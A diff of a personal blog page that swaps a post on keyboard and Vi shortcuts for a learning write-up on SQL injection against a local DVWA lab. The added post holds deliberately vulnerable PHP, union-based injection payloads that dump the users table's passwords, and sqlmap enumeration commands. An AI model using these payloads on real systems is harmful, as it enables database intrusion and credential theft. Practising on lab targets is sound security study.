@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="基操," />
+  <meta name="keywords" content="sql," />
 
 
 
@@ -90,17 +90,34 @@
 
 
 
-<meta name="description" content="[TOC] 快捷键F&#x2F;fnF2：对这个选定的文件或文件夹重命名。 F3：在资源管理器或桌面上按下F3，则会出现“搜索文件”的窗口，因此如果想对某个文件夹中的文件进行搜索，那么直接按下F3键就能快速打开搜索窗口，并且搜索范围已经默认设置为该文件夹。 F4：这个键用来打开IE中的地址栏列表，要关闭IE窗口，可以用Alt＋F4组合键。 F5：用来刷新IE或资源管理器中当前所在窗口的内容。 F6：可以快速">
+<meta name="description" content="dvwa-sql-显注-low 就拿dvwa学习一下sql的手工注入,以及sqlmap的使用 做些笔记  tip concat_ws(1,2,3): 使用1作为连接符,连接2和3 方便从一个显示位,显示多种内容  char(32,58,32): char将其中的ascii值转成字符 这里是空格冒号空格 作为concat_ws使用,比较美观   low源码 123456789101112131415">
 <meta property="og:type" content="article">
-<meta property="og:title" content="快捷键">
-<meta property="og:url" content="https://mercer5.github.io/2019/12/10/%E5%BF%AB%E6%8D%B7%E9%94%AE/index.html">
+<meta property="og:title" content="dvwa-sql-显注-low">
+<meta property="og:url" content="https://mercer5.github.io/2020/04/15/dvwa-sql-%E6%98%BE%E6%B3%A8-low/index.html">
 <meta property="og:site_name" content="mercer">
-<meta property="og:description" content="[TOC] 快捷键F&#x2F;fnF2：对这个选定的文件或文件夹重命名。 F3：在资源管理器或桌面上按下F3，则会出现“搜索文件”的窗口，因此如果想对某个文件夹中的文件进行搜索，那么直接按下F3键就能快速打开搜索窗口，并且搜索范围已经默认设置为该文件夹。 F4：这个键用来打开IE中的地址栏列表，要关闭IE窗口，可以用Alt＋F4组合键。 F5：用来刷新IE或资源管理器中当前所在窗口的内容。 F6：可以快速">
-<meta property="article:published_time" content="2019-12-10T05:04:51.000Z">
-<meta property="article:modified_time" content="2020-08-30T07:15:11.640Z">
+<meta property="og:description" content="dvwa-sql-显注-low 就拿dvwa学习一下sql的手工注入,以及sqlmap的使用 做些笔记  tip concat_ws(1,2,3): 使用1作为连接符,连接2和3 方便从一个显示位,显示多种内容  char(32,58,32): char将其中的ascii值转成字符 这里是空格冒号空格 作为concat_ws使用,比较美观   low源码 123456789101112131415">
+<meta property="og:image" content="https://mercer5.github.io/2020/04/15/dvwa-sql-%E6%98%BE%E6%B3%A8-low/Snipaste_2020-04-15_10-48-47.png">
+<meta property="og:image" content="https://mercer5.github.io/2020/04/15/dvwa-sql-%E6%98%BE%E6%B3%A8-low/Snipaste_2020-04-15_10-48-55.png">
+<meta property="og:image" content="https://mercer5.github.io/2020/04/15/dvwa-sql-%E6%98%BE%E6%B3%A8-low/Snipaste_2020-04-15_10-51-10.png">
+<meta property="og:image" content="https://mercer5.github.io/2020/04/15/dvwa-sql-%E6%98%BE%E6%B3%A8-low/Snipaste_2020-04-15_10-47-58.png">
+<meta property="og:image" content="https://mercer5.github.io/2020/04/15/dvwa-sql-%E6%98%BE%E6%B3%A8-low/Snipaste_2020-04-15_16-23-32.png">
+<meta property="og:image" content="https://mercer5.github.io/2020/04/15/dvwa-sql-%E6%98%BE%E6%B3%A8-low/Snipaste_2020-04-15_16-27-26.png">
+<meta property="og:image" content="https://mercer5.github.io/2020/04/15/dvwa-sql-%E6%98%BE%E6%B3%A8-low/Snipaste_2020-04-15_16-38-54.png">
+<meta property="og:image" content="https://mercer5.github.io/2020/04/15/dvwa-sql-%E6%98%BE%E6%B3%A8-low/Snipaste_2020-04-15_16-43-02.png">
+<meta property="og:image" content="https://mercer5.github.io/2020/04/15/dvwa-sql-%E6%98%BE%E6%B3%A8-low/Snipaste_2020-04-15_16-46-11.png">
+<meta property="og:image" content="https://mercer5.github.io/2020/04/15/dvwa-sql-%E6%98%BE%E6%B3%A8-low/Snipaste_2020-04-15_16-46-27.png">
+<meta property="og:image" content="https://mercer5.github.io/2020/04/15/dvwa-sql-%E6%98%BE%E6%B3%A8-low/Snipaste_2020-04-15_16-46-37.png">
+<meta property="og:image" content="https://mercer5.github.io/2020/04/15/dvwa-sql-%E6%98%BE%E6%B3%A8-low/Snipaste_2020-04-15_17-13-57.png">
+<meta property="og:image" content="https://mercer5.github.io/2020/04/15/dvwa-sql-%E6%98%BE%E6%B3%A8-low/Snipaste_2020-04-15_17-15-16.png">
+<meta property="og:image" content="https://mercer5.github.io/2020/04/15/dvwa-sql-%E6%98%BE%E6%B3%A8-low/image-20200415171817802.png">
+<meta property="og:image" content="https://mercer5.github.io/2020/04/15/dvwa-sql-%E6%98%BE%E6%B3%A8-low/image-20200415172014493.png">
+<meta property="og:image" content="https://mercer5.github.io/2020/04/15/dvwa-sql-%E6%98%BE%E6%B3%A8-low/image-20200415172329770.png">
+<meta property="article:published_time" content="2020-04-15T09:38:31.000Z">
+<meta property="article:modified_time" content="2022-01-06T08:23:23.000Z">
 <meta property="article:author" content="mercer">
-<meta property="article:tag" content="基操">
+<meta property="article:tag" content="sql">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mercer5.github.io/2020/04/15/dvwa-sql-%E6%98%BE%E6%B3%A8-low/Snipaste_2020-04-15_10-48-47.png">
 
 
 
@@ -130,13 +147,13 @@
 
 
 
-  <link rel="canonical" href="https://mercer5.github.io/2019/12/10/快捷键/"/>
+  <link rel="canonical" href="https://mercer5.github.io/2020/04/15/dvwa-sql-显注-low/"/>
 
 
 
 
 
-  <title>快捷键 | mercer</title>
+  <title>dvwa-sql-显注-low | mercer</title>
   
 
 
@@ -255,7 +272,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://mercer5.github.io/2019/12/10/%E5%BF%AB%E6%8D%B7%E9%94%AE/">
+    <link itemprop="mainEntityOfPage" href="https://mercer5.github.io/2020/04/15/dvwa-sql-%E6%98%BE%E6%B3%A8-low/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="mercer">
@@ -272,7 +289,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">快捷键</h1>
+          <h1 class="post-title" itemprop="name headline">dvwa-sql-显注-low</h1>
         
 
         <div class="post-meta">
@@ -284,8 +301,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-10T13:04:51+08:00">
-                2019-12-10
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-15T17:38:31+08:00">
+                2020-04-15
               </time>
             
 
@@ -300,8 +317,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-08-30T15:15:11+08:00">
-                2020-08-30
+              <time title="更新于" itemprop="dateModified" datetime="2022-01-06T16:23:23+08:00">
+                2022-01-06
               </time>
             
           </span>
@@ -319,8 +336,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/" itemprop="url" rel="index">
-                    <span itemprop="name">杂七杂八</span>
+                  <a href="/categories/sql/" itemprop="url" rel="index">
+                    <span itemprop="name">sql</span>
                   </a>
                 </span>
 
@@ -336,7 +353,7 @@
 
           
           
-             <span id="/2019/12/10/%E5%BF%AB%E6%8D%B7%E9%94%AE/" class="leancloud_visitors" data-flag-title="快捷键">
+             <span id="/2020/04/15/dvwa-sql-%E6%98%BE%E6%B3%A8-low/" class="leancloud_visitors" data-flag-title="dvwa-sql-显注-low">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -361,7 +378,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1.8k
+                  919
                 </span>
               
 
@@ -377,7 +394,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  6
+                  4
                 </span>
               
             </div>
@@ -398,486 +415,131 @@
       
 
       
-        <p>[TOC]</p>
-<h1 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h1><h2 id="F-fn"><a href="#F-fn" class="headerlink" title="F/fn"></a>F/fn</h2><p>F2：对这个选定的文件或文件夹重命名。</p>
-<p>F3：在资源管理器或桌面上按下F3，则会出现“搜索文件”的窗口，因此如果想对某个文件夹中的文件进行搜索，那么直接按下F3键就能快速打开搜索窗口，并且搜索范围已经默认设置为该文件夹。</p>
-<p>F4：这个键用来打开IE中的地址栏列表，要关闭IE窗口，可以用Alt＋F4组合键。</p>
-<p>F5：用来刷新IE或资源管理器中当前所在窗口的内容。</p>
-<p>F6：可以快速在资源管理器及IE中定位到地址栏。</p>
-<p>F8：在启动电脑时，可以用它来显示启动菜单。有些电脑还可以在电脑启动最初按下这个键来快速调出启动设置菜单，从中可以快速选择是软盘启动，还是光盘启动，或者直接用硬盘启动，不必费事进入BIOS进行启动顺序的修改。另外，还可以在安装Windows时接受微软的安装协议。</p>
-<p>F11：可以使当前的资源管理器或IE变为全屏显示</p>
-<p>F12：浏览器中检查源和元素。在Word中，按下它会快速弹出另存为文件的窗口。</p>
-<p><strong>Fn键是“Function”（功能）的缩写，用以和其他的按键组成组合键以便实现控制作用。</strong></p>
-<p>fn+f1:睡眠状态</p>
-<p>fn+f2:飞行模式</p>
-<p>fn+f3:键盘灯灭</p>
-<p>fn+f4:键盘灯亮</p>
-<p>fn+f5:屏幕变暗</p>
-<p>fn+f6:屏幕变亮</p>
-<p>fn+f7:关闭屏幕</p>
-<p>fn+f8:第二屏幕/投影切换</p>
-<p>fn+f9:关闭触摸板</p>
-<p>fn+f10:静音</p>
-<p>fn+f11:降低音量</p>
-<p>fn+f12:升高音量</p>
-<h2 id="VM"><a href="#VM" class="headerlink" title="VM"></a>VM</h2><ol>
-<li><p>Ctrl+Alt+T 打开终端(ubuntu)</p>
+        <h1 id="dvwa-sql-显注-low"><a href="#dvwa-sql-显注-low" class="headerlink" title="dvwa-sql-显注-low"></a>dvwa-sql-显注-low</h1><blockquote>
+<p>就拿dvwa学习一下sql的手工注入,以及sqlmap的使用</p>
+<p>做些笔记</p>
+</blockquote>
+<h2 id="tip"><a href="#tip" class="headerlink" title="tip"></a>tip</h2><ol>
+<li><p>concat_ws(1,2,3): 使用1作为连接符,连接2和3</p>
+<p>方便从一个显示位,显示多种内容</p>
 </li>
-<li><p>ctrl+E 关闭客户机</p>
-</li>
-<li><p>file/cd  双击tap可以显示该文件夹中的内容</p>
-<p>​             输入几个字母后(该目录下只有一个以这几个字母开的的文件) 单击tap 自动填充</p>
+<li><p>char(32,58,32): char将其中的ascii值转成字符</p>
+<p>这里是空格冒号空格</p>
+<p>作为concat_ws使用,比较美观</p>
 </li>
 </ol>
-<h2 id="Sublime-Text"><a href="#Sublime-Text" class="headerlink" title="Sublime Text"></a>Sublime Text</h2><ol>
-<li>ctrl+f 查找</li>
+<h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_REQUEST[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        $first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">        $last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h3><ol>
+<li><p>输入<code>&#39;</code>,发现有报错,说明很可能有sql注入</p>
+</li>
+<li><p><code>1&#39; order by 2#</code>猜解列数</p>
+<p>order by后面加数字时,表示按第几列进行排序</p>
+<p>如果没有那列的话,就会报错</p>
+<p>该步的目的,是为了使用union select</p>
+<p>因为union select 要求两者的列数相同,才能进行查询</p>
+<p><img src="Snipaste_2020-04-15_10-48-47.png" alt="Snipaste_2020-04-15_10-48-47"></p>
+<p><img src="Snipaste_2020-04-15_10-48-55.png" alt="Snipaste_2020-04-15_10-48-55"></p>
+</li>
+<li><p><code>1&#39; union select 1,2#</code>爆显示位</p>
+<p>从输入中,可以发现,两个都能显示出来</p>
+<p>也就是说,每次可以查询两个地方</p>
+<p><img src="Snipaste_2020-04-15_10-51-10.png" alt="Snipaste_2020-04-15_10-51-10"></p>
+</li>
+<li><p><code>1&#39; union select version(),database()#</code></p>
+<p>查询一下sql版本和当前数据库名称</p>
+<p>sql版本很重要,因为版本&gt;(多少我忘了&gt;&lt;)时,会有一个<code>information_schema</code>数据库,里面有好多好多好东西</p>
+<p><img src="Snipaste_2020-04-15_10-47-58.png" alt="Snipaste_2020-04-15_10-47-58"></p>
+<p><code>1&#39; union select null,concat_ws(char(32,58,32),user(),database(),version())#</code></p>
+<p>另一种方法,会在第二个显示位一起爆出用户、数据库及其版本信息</p>
+<p><img src="Snipaste_2020-04-15_16-23-32.png" alt="Snipaste_2020-04-15_16-23-32"></p>
+</li>
+<li><p><code>1&#39; union select null,group_concat(table_name) from information_schema.tables where table_schema=&#39;dvwa&#39; #</code></p>
+<p>版本比较大,所以有<code>information_schema</code>;得知数据库名后,就可以查表了</p>
+<p><img src="Snipaste_2020-04-15_16-27-26.png" alt="Snipaste_2020-04-15_16-27-26"></p>
+<p>可以看出dvwa中有两个表<code>guestbook</code>and<code>users</code></p>
+<p>明显users重要点,所以下一步查users的列</p>
+</li>
+<li><p><code>1&#39; union select null,group_concat(column_name) from information_schema.columns where table_schema=&#39;dvwa&#39; and table_name=&#39;users&#39; #</code></p>
+<p><img src="Snipaste_2020-04-15_16-38-54.png" alt="Snipaste_2020-04-15_16-38-54"></p>
+<p>其中<code>user</code>和<code>password</code>看起来比较重要</p>
+</li>
+<li><p><code>1&#39; union select null, group_concat(concat_ws(char(32,58,32),user,password)) from users #</code></p>
+<p><img src="Snipaste_2020-04-15_16-43-02.png" alt="Snipaste_2020-04-15_16-43-02"></p>
+</li>
+<li><p>如果不想显示在一条上,而是分开查询的话,把group_concat删了就行</p>
+<ul>
+<li><p>查表</p>
+<p><code>1&#39; union select null,table_name from information_schema.tables where table_schema=&#39;dvwa&#39; #</code></p>
+<p><img src="Snipaste_2020-04-15_16-46-11.png" alt="Snipaste_2020-04-15_16-46-11"></p>
+</li>
+<li><p>查列</p>
+<p><code>1&#39; union select null,column_name from information_schema.columns where table_schema=&#39;dvwa&#39; and table_name=&#39;users&#39; #</code></p>
+<p><img src="Snipaste_2020-04-15_16-46-27.png" alt="Snipaste_2020-04-15_16-46-27"></p>
+</li>
+<li><p>查内容</p>
+<p><code>1&#39; union select null, concat_ws(char(32,58,32),user,password) from users #</code></p>
+<p><img src="Snipaste_2020-04-15_16-46-37.png" alt="Snipaste_2020-04-15_16-46-37"></p>
+</li>
+</ul>
+</li>
 </ol>
-<h2 id="vscode"><a href="#vscode" class="headerlink" title="vscode"></a>vscode</h2><ol>
-<li><p>alt(option)+shift+down 往下复制粘贴这一行</p>
-<p>选中一段可以多行复制粘贴</p>
+<h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><ol>
+<li><p>准备好网址</p>
+<p>在id中输入1,是的url中包含参数名称</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/DVWA-master/</span>vulnerabilities<span class="regexp">/sqli/</span>?id=<span class="number">1</span>&amp;Submit=Submit<span class="comment">#</span></span><br></pre></td></tr></table></figure>
 </li>
-<li><p>lorem+tap 自动生成一段话</p>
-<p>lorem(number)+tap 自动生成number个单词的段落</p>
-<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lore<span class="name">m3</span></span><br></pre></td></tr></table></figure>
+<li><p>准备好cookie</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">security</span>=low; <span class="attribute">PHPSESSID</span>=9v0e6li5s4iok70h3fi7al0gv1</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>alt+z 自动换行(切换)</p>
+<li><p>打开sqlmap,输入</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="params">--cookie=</span><span class="string">"security=low; PHPSESSID=9v0e6li5s4iok70h3fi7al0gv1"</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure>
+
+<p>康康有没有sql注入</p>
+<ul>
+<li>-u参数指定目标URL</li>
+<li>–batch参数采用默认选项,不进行询问</li>
+<li>–cookie参数指定cookie</li>
+</ul>
+<p>可以看到是存在注入的</p>
+<p><img src="Snipaste_2020-04-15_17-13-57.png" alt="Snipaste_2020-04-15_17-13-57"></p>
 </li>
-<li><p>ctrl+/ 自动生成注释</p>
+<li><p>查看所有的数据库</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="params">--cookie=</span><span class="string">"security=low; PHPSESSID=9v0e6li5s4iok70h3fi7al0gv1"</span> <span class="params">--batch</span> <span class="params">--dbs</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>–dbs所有数据库</li>
+</ul>
+<p><img src="Snipaste_2020-04-15_17-15-16.png" alt="Snipaste_2020-04-15_17-15-16"></p>
 </li>
-<li><p>直接输入标签回车,自动补全&lt;&gt;&lt;/&gt;</p>
+<li><p>所以我们要用的应该是dvwa那个库,然后康康里面有什么表</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="params">--cookie=</span><span class="string">"security=low; PHPSESSID=9v0e6li5s4iok70h3fi7al0gv1"</span> <span class="params">--batch</span> -D dvwa <span class="params">--tables</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>-D参数指定为dvwa数据库</li>
+<li>–tables参数查看所有的表</li>
+</ul>
+<p><img src="image-20200415171817802.png" alt="image-20200415171817802"></p>
 </li>
-<li><p>.classname 回车  自动生成div class=classname的块</p>
+<li><p>查看users表中的列</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="attribute">--cookie</span>=<span class="string">"security=low; PHPSESSID=9v0e6li5s4iok70h3fi7al0gv1"</span> --batch -D dvwa -T<span class="built_in"> users </span>--columns</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>-T参数指定表为users</li>
+<li>–columns查看该表的所有列</li>
+</ul>
+<p><img src="image-20200415172014493.png" alt="image-20200415172014493"></p>
 </li>
-</ol>
-<h2 id="Vi-Editor-Cheat-Sheet"><a href="#Vi-Editor-Cheat-Sheet" class="headerlink" title="Vi Editor Cheat Sheet"></a>Vi Editor Cheat Sheet</h2><h3 id="光标移动命令"><a href="#光标移动命令" class="headerlink" title="光标移动命令"></a>光标移动命令</h3><h4 id="字符"><a href="#字符" class="headerlink" title="字符"></a>字符</h4><table>
-<thead>
-<tr>
-<th>按键</th>
-<th>解释</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>h,j,k,l</strong></td>
-<td>左，右，上，下</td>
-</tr>
-</tbody></table>
-<h4 id="文本"><a href="#文本" class="headerlink" title="文本"></a>文本</h4><table>
-<thead>
-<tr>
-<th>按键</th>
-<th>解释</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>w,W,b,B</strong></td>
-<td>向前，向后一个词</td>
-</tr>
-<tr>
-<td><strong>e,E</strong></td>
-<td>词尾</td>
-</tr>
-<tr>
-<td><strong>(,)</strong></td>
-<td>下一个，前一个句子的开头</td>
-</tr>
-<tr>
-<td><strong>{,}</strong></td>
-<td>下一个，前一个段落的开头</td>
-</tr>
-<tr>
-<td><strong>[[, ]]</strong></td>
-<td>下一个，前一个小节的开头</td>
-</tr>
-</tbody></table>
-<h4 id="行"><a href="#行" class="headerlink" title="行"></a>行</h4><table>
-<thead>
-<tr>
-<th>按键</th>
-<th>解释</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>0,$</strong></td>
-<td>所在行的最前，最后位置</td>
-</tr>
-<tr>
-<td><strong>^</strong></td>
-<td>所在行的第一个非空字符位置</td>
-</tr>
-<tr>
-<td><strong>+,-</strong></td>
-<td>下一，前一行的第一个字符位置</td>
-</tr>
-<tr>
-<td><strong>H</strong></td>
-<td>屏幕显示区内最顶端一行</td>
-</tr>
-<tr>
-<td><strong>M</strong></td>
-<td>屏幕显示区内中间一行</td>
-</tr>
-<tr>
-<td><strong>L</strong></td>
-<td>屏幕显示区内最底端一行</td>
-</tr>
-</tbody></table>
-<h4 id="滚动"><a href="#滚动" class="headerlink" title="滚动"></a>滚动</h4><table>
-<thead>
-<tr>
-<th>按键</th>
-<th>解释</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>[Ctrl]F, [Ctrl]B</strong></td>
-<td>向前，向后滚动一个屏幕显示范围</td>
-</tr>
-<tr>
-<td><strong>[Ctrl]D, [Ctrl]U</strong></td>
-<td>向下，向上滚动半个屏幕显示范围</td>
-</tr>
-<tr>
-<td><strong>[Ctrl]E, [Ctrl]Y</strong></td>
-<td>在窗口下方，上方再多显示一行</td>
-</tr>
-<tr>
-<td><strong>z[Enter]</strong></td>
-<td>滚动屏幕，直到光标在屏幕最上方</td>
-</tr>
-<tr>
-<td><strong>z.</strong></td>
-<td>滚动屏幕，直到光标在屏幕中间</td>
-</tr>
-<tr>
-<td><strong>z-</strong></td>
-<td>滚动屏幕，直到光标在屏幕最下方</td>
-</tr>
-</tbody></table>
-<h4 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h4><table>
-<thead>
-<tr>
-<th>按键</th>
-<th>解释</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>/</strong>(words)</td>
-<td>向前搜索字符words</td>
-</tr>
-<tr>
-<td><strong>?*</strong>pattern*</td>
-<td>向后搜索字符<em>pattern</em></td>
-</tr>
-<tr>
-<td><strong>n,N</strong></td>
-<td>在相同，不同的搜索方向上搜索上一次搜索的字符</td>
-</tr>
-<tr>
-<td><strong>f*</strong>x*</td>
-<td>在所在行向前搜索字符<em>x</em></td>
-</tr>
-<tr>
-<td><strong>F*</strong>x*</td>
-<td>在所在行向后搜索字符<em>x</em></td>
-</tr>
-<tr>
-<td><strong>;</strong></td>
-<td>重复执行上一个当前行搜索</td>
-</tr>
-<tr>
-<td><strong>,</strong></td>
-<td>重复执行上一个当前行搜索，但以相反的方向</td>
-</tr>
-</tbody></table>
-<h4 id="行号"><a href="#行号" class="headerlink" title="行号"></a>行号</h4><table>
-<thead>
-<tr>
-<th>按键</th>
-<th>解释</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>[Ctrl]G</strong></td>
-<td>显示当前行号</td>
-</tr>
-<tr>
-<td><strong>:set nu</strong></td>
-<td>显示所有行号</td>
-</tr>
-<tr>
-<td><strong>:set nonu</strong></td>
-<td>取消显示所有行号</td>
-</tr>
-<tr>
-<td><em>n**</em>G**</td>
-<td>移动到行号是<em>n</em>的一行</td>
-</tr>
-<tr>
-<td><strong>G</strong></td>
-<td>移动到当前文件的最后一行</td>
-</tr>
-<tr>
-<td><strong>gg</strong></td>
-<td>第一行</td>
-</tr>
-</tbody></table>
-<h4 id="标记位置"><a href="#标记位置" class="headerlink" title="标记位置"></a>标记位置</h4><table>
-<thead>
-<tr>
-<th>按键</th>
-<th>解释</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>m*</strong>x*</td>
-<td>标记当前位置为<em>x</em></td>
-</tr>
-<tr>
-<td><strong>`*</strong>x*</td>
-<td>移动光标至标记<em>x</em></td>
-</tr>
-<tr>
-<td><strong>``</strong></td>
-<td>返回上一个标记</td>
-</tr>
-<tr>
-<td><strong>‘*</strong>x*</td>
-<td>移动到包含标记<em>x</em>的一行的开头</td>
-</tr>
-<tr>
-<td><strong>‘’</strong></td>
-<td>返回包含上一个标记的一行的开头</td>
-</tr>
-</tbody></table>
-<h3 id="编辑命令"><a href="#编辑命令" class="headerlink" title="编辑命令"></a>编辑命令</h3><h4 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h4><table>
-<thead>
-<tr>
-<th>按键</th>
-<th>解释</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>i,a</strong></td>
-<td>在光标前，后输入内容</td>
-</tr>
-<tr>
-<td><strong>I,A</strong></td>
-<td>在光标行首，尾输入内容</td>
-</tr>
-<tr>
-<td><strong>o,O</strong></td>
-<td>在光标的下，上开启新行，输入内容</td>
-</tr>
-</tbody></table>
-<h4 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h4><table>
-<thead>
-<tr>
-<th>按键</th>
-<th>解释</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>r</strong></td>
-<td>替换光标所在字符一次</td>
-</tr>
-<tr>
-<td><strong>～</strong></td>
-<td>更改大小写</td>
-</tr>
-<tr>
-<td><strong>c*</strong>m*</td>
-<td>在移动范围为<em>m</em>的区域内更改文本，移动范围请查阅光标移动命令。（如：cw 为更改下一个词）</td>
-</tr>
-<tr>
-<td><strong>cc</strong></td>
-<td>更改当前行</td>
-</tr>
-<tr>
-<td><strong>C</strong></td>
-<td>更改至行尾的内容</td>
-</tr>
-<tr>
-<td><strong>R</strong></td>
-<td>一直替换光标所在字符，直到按下[ESC]结束</td>
-</tr>
-<tr>
-<td><strong>s</strong></td>
-<td>删除当前字符，并继续输入</td>
-</tr>
-<tr>
-<td><strong>S</strong></td>
-<td>删除当前行，并继续输入</td>
-</tr>
-<tr>
-<td>格式</td>
-<td>:num1,num2s/value1/value2/g</td>
-</tr>
-<tr>
-<td>格式</td>
-<td>:num1,$s/value1/value2/g</td>
-</tr>
-<tr>
-<td><strong>g-&gt;gc</strong></td>
-<td>更改时确认</td>
-</tr>
-</tbody></table>
-<h4 id="删除，移动"><a href="#删除，移动" class="headerlink" title="删除，移动"></a>删除，移动</h4><table>
-<thead>
-<tr>
-<th>按键</th>
-<th>解释</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>x</strong></td>
-<td>删除当前字符</td>
-</tr>
-<tr>
-<td><strong>X</strong></td>
-<td>删除光标左边的字符</td>
-</tr>
-<tr>
-<td><strong>d*</strong>m*</td>
-<td>在移动范围为<em>m</em>的区域内删除文本，移动范围请查阅光标移动命令。（如：dw 为删除下一个词）</td>
-</tr>
-<tr>
-<td><strong>dd</strong></td>
-<td>删除当前行</td>
-</tr>
-<tr>
-<td><strong>D</strong></td>
-<td>删除至行尾的内容</td>
-</tr>
-<tr>
-<td><strong>p,P</strong></td>
-<td>将删除的内容插入在光标前，后位置</td>
-</tr>
-</tbody></table>
-<h4 id="Yank-拷贝"><a href="#Yank-拷贝" class="headerlink" title="Yank(拷贝)"></a>Yank(拷贝)</h4><table>
-<thead>
-<tr>
-<th>按键</th>
-<th>解释</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>y*</strong>m*</td>
